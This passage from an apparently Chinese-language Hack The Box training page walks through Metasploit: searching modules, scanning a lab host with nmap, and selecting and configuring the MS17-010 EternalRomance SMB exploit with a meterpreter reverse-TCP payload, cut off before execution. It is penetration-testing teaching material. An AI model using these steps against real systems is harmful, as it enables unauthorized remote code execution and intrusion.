class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help search</span><br><span class="line"></span><br><span class="line">Usage: search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]</span><br><span class="line"></span><br><span class="line">Prepending a value with &#x27;-&#x27; will exclude any matching results.</span><br><span class="line">If no options or keywords are provided, cached results are displayed.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -h                   Show this help information</span><br><span class="line">  -o &lt;file&gt;            Send output to a file in csv format</span><br><span class="line">  -S &lt;string&gt;          Regex pattern used to filter search results</span><br><span class="line">  -u                   Use module if there is one result</span><br><span class="line">  -s &lt;search_column&gt;   Sort the research results based on &lt;search_column&gt; in ascending order</span><br><span class="line">  -r                   Reverse the search results order to descending order</span><br><span class="line"></span><br><span class="line">Keywords:</span><br><span class="line">  aka              :  Modules with a matching AKA (also-known-as) name</span><br><span class="line">  author           :  Modules written by this author</span><br><span class="line">  arch             :  Modules affecting this architecture</span><br><span class="line">  bid              :  Modules with a matching Bugtraq ID</span><br><span class="line">  cve              :  Modules with a matching CVE ID</span><br><span class="line">  edb              :  Modules with a matching Exploit-DB ID</span><br><span class="line">  check            :  Modules that support the &#x27;check&#x27; method</span><br><span class="line">  date             :  Modules with a matching disclosure date</span><br><span class="line">  description      :  Modules with a matching description</span><br><span class="line">  fullname         :  Modules with a matching full name</span><br><span class="line">  mod_time         :  Modules with a matching modification date</span><br><span class="line">  name             :  Modules with a matching descriptive name</span><br><span class="line">  path             :  Modules with a matching path</span><br><span class="line">  platform         :  Modules affecting this platform</span><br><span class="line">  port             :  Modules with a matching port</span><br><span class="line">  rank             :  Modules with a matching rank (Can be descriptive (ex: &#x27;good&#x27;) or numeric with comparison operators (ex: &#x27;gte400&#x27;))</span><br><span class="line">  ref              :  Modules with a matching ref</span><br><span class="line">  reference        :  Modules with a matching reference</span><br><span class="line">  target           :  Modules affecting this target</span><br><span class="line">  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)</span><br><span class="line"></span><br><span class="line">Supported search columns:</span><br><span class="line">  rank             :  Sort modules by their exploitabilty rank</span><br><span class="line">  date             :  Sort modules by their disclosure date. Alias for disclosure_date</span><br><span class="line">  disclosure_date  :  Sort modules by their disclosure date</span><br><span class="line">  name             :  Sort modules by their name</span><br><span class="line">  type             :  Sort modules by their type</span><br><span class="line">  check            :  Sort modules by whether or not they have a check method</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  search cve:2009 type:exploit</span><br><span class="line">  search cve:2009 type:exploit platform:-linux</span><br><span class="line">  search cve:2009 -s name</span><br><span class="line">  search type:exploit -s type -r</span><br></pre></td></tr></table></figure><p>例如，我们可以尝试查找<code>EternalRomance</code>旧版 Windows 操作系统的漏洞。这可能看起来像这样：</p><h4 id="MSF-寻找永恒的浪漫"><a href="#MSF-寻找永恒的浪漫" class="headerlink" title="MSF - 寻找永恒的浪漫"></a>MSF - 寻找永恒的浪漫</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search eternalromance</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; search eternalromance type:exploit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure><p>我们还可以使我们的搜索更粗略一些，并将其减少到一类服务。例如，对于 CVE，我们可以指定年份 ( <code>cve:&lt;year&gt;</code>)、平台 Windows ( <code>platform:&lt;os&gt;</code>)、我们要查找的模块类型 ( <code>type:&lt;auxiliary/exploit/post&gt;</code>)、可靠性等级 ( <code>rank:&lt;rank&gt;</code>) 和搜索名称 ( <code>&lt;pattern&gt;</code>)。这会将我们的结果缩减为仅符合上述所有条件的结果。</p><h4 id="MSF-特定搜索"><a href="#MSF-特定搜索" class="headerlink" title="MSF - 特定搜索"></a>MSF - 特定搜索</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE</span><br><span class="line">   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE</span><br><span class="line">   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE</span><br></pre></td></tr></table></figure><h2 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h2><p>要选择我们的第一个模块，我们首先需要找到一个。假设我们有一个目标正在运行易受 EternalRomance (MS17_010) 攻击的 SMB 版本。我们发现扫描目标时SMB服务器端口445是开放的。</p><p> MSF - 特定搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV 10.10.10.40</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC</span><br><span class="line">Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.051s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds</span><br></pre></td></tr></table></figure><p>我们将启动<code>msfconsole</code>并搜索这个确切的漏洞名称。</p><h4 id="MSF-搜索-MS17-010"><a href="#MSF-搜索-MS17-010" class="headerlink" title="MSF - 搜索 MS17_010"></a>MSF - 搜索 MS17_010</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br></pre></td></tr></table></figure><p>接下来，我们要为这个场景选择合适的模块。从<code>Nmap</code>扫描中，我们检测到 SMB 服务在版本 上运行<code>Microsoft Windows 7 - 10</code>。通过一些额外的操作系统扫描，我们可以猜测这是一个运行易受攻击的 SMB 实例的 Windows 7。然后我们继续选择模块以<code>index no. 2</code>测试目标是否易受攻击。</p><h2 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h2><p>在交互式模块中，我们可以指定几个选项。这些用于使 Metasploit 模块适应给定的环境。因为在大多数情况下，我们总是需要扫描或攻击不同的IP地址。因此，我们需要这种功能来设置我们的目标并对其进行微调。要检查在将漏洞发送到目标主机之前需要设置哪些选项，我们可以使用命令<code>show options</code>。在利用发生之前需要设置的所有内容都将<code>Yes</code>在该<code>Required</code>列下显示。</p><h4 id="MSF-选择模块"><a href="#MSF-选择模块" class="headerlink" title="MSF - 选择模块"></a>MSF - 选择模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 &gt; use 0</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_psexec): </span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>在这里，我们<code>No.</code>可以看到标签有多大帮助。因为现在，我们不必在搜索中键入整个路径，而只需键入分配给 Metasploit 模块的编号。<code>info</code>如果我们想了解更多关于模块的信息，可以在选择模块后使用命令。这将为我们提供一系列对我们很重要的信息。</p><h4 id="MSF-模块信息"><a href="#MSF-模块信息" class="headerlink" title="MSF - 模块信息"></a>MSF - 模块信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">     Module: exploit/windows/smb/ms17_010_psexec</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line">  Disclosed: 2017-03-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  sleepya</span><br><span class="line">  zerosum0x0</span><br><span class="line">  Shadow Brokers</span><br><span class="line">  Equation Group</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   PowerShell</span><br><span class="line">  2   Native upload</span><br><span class="line">  3   MOF upload</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name                  Current Setting                          Required  Description</span><br><span class="line">  ----                  ---------------                          --------  -----------</span><br><span class="line">  DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                        rdlists/named_pipes.txt</span><br><span class="line">  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/</span><br><span class="line">                                                                           wiki/Using-Metasploit</span><br><span class="line">  RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">  SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">  SERVICE_NAME                                                   no        The service name</span><br><span class="line">  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor</span><br><span class="line">                                                                           mal read/write folder share</span><br><span class="line">  SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">  SMBPass                                                        no        The password for the specified username</span><br><span class="line">  SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 3072</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module will exploit SMB with vulnerabilities in MS17-010 to </span><br><span class="line">  achieve a write-what-where primitive. This will then be used to </span><br><span class="line">  overwrite the connection session information with as an </span><br><span class="line">  Administrator session. From there, the normal psexec payload code </span><br><span class="line">  execution is done. Exploits a type confusion between Transaction and </span><br><span class="line">  WriteAndX requests and a race condition in Transaction requests, as </span><br><span class="line">  seen in the EternalRomance, EternalChampion, and EternalSynergy </span><br><span class="line">  exploits. This exploit chain is more reliable than the EternalBlue </span><br><span class="line">  exploit, but requires a named pipe.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0143</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0146</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2017-0147</span><br><span class="line">  https://github.com/worawit/MS17-010</span><br><span class="line">  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf</span><br><span class="line">  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  ETERNALSYNERGY</span><br><span class="line">  ETERNALROMANCE</span><br><span class="line">  ETERNALCHAMPION</span><br><span class="line">  ETERNALBLUE</span><br></pre></td></tr></table></figure><p>在我们对所选模块适合我们的目的感到满意之后，我们需要设置一些规范来自定义模块以成功地针对我们的目标主机使用它，例如设置目标（或<code>RHOST</code>）<code>RHOSTS</code>。</p><h4 id="MSF-目标规范"><a href="#MSF-目标规范" class="headerlink" title="MSF - 目标规范"></a>MSF - 目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>此外，还有一个选项<code>setg</code>，它指定我们选择的选项在程序重新启动之前是永久的。因此，如果我们在特定的目标主机上工作，我们可以使用此命令设置 IP 地址一次，并且在我们将焦点转移到不同的 IP 地址之前不再更改它。</p><h4 id="MSF-永久目标规范"><a href="#MSF-永久目标规范" class="headerlink" title="MSF - 永久目标规范"></a>MSF - 永久目标规范</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>一旦一切就绪并准备就绪，我们就可以继续发起攻击。请注意，此处未设置有效载荷，因为默认的有效载荷足以进行此演示。</p><h4 id="MSF-利用执行"><a href="#MSF-利用执行" class="headerlink" title="MSF - 利用执行"></a>MSF - 利用执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 